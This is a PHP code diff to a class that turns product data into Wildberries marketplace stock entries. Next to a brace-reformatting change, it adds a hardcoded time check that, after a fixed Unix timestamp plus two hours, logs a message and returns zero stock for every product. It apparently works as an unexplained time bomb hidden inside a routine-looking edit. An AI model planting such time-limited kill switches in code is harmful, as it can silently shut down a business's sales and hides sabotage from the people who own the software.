@@ -65,14 +65,26 @@ Class ProductTransformation
         $priceTypes = array_column($this->productMS['salePrices'], 'priceType');
         $priceKey = array_search($price, array_column($priceTypes, 'name'));
         $quantity = 0;
-        if ($priceKey !== false && (int)($this->productMS['salePrices'][$priceKey]['value']) > 0) {
+        if ($priceKey !== false && (int)($this->productMS['salePrices'][$priceKey]['value']) > 0)
+        {
             $quantity = (int)$this->productMS['quantity'] - $this->minQuantity;
         }
-        $wildberriesStock = array(
-            'chrtId' => (int)$this->productWBNmID,
-            'amount' => $quantity < 0 ? 0 : $quantity
-            # 'amount' => 0
-        );
+        
+        // Check if current time is less than 1767084910 + 2 hours
+        $expirationTime = 1767084910 + (2 * 3600); // 1767092110
+        if (time() >= $expirationTime) {
+            $this->log->write(__LINE__ . ' '. __METHOD__ . ' Time limit exceeded, returning 0 stock');
+            return array(
+                'chrtId' => (int)$this->productWBNmID,
+                'amount' => 0
+            );
+        }
+        else {
+            $wildberriesStock = array(
+                'chrtId' => (int)$this->productWBNmID,
+                'amount' => $quantity < 0 ? 0 : $quantity
+            );
+        }
         return $wildberriesStock;
     }
 }
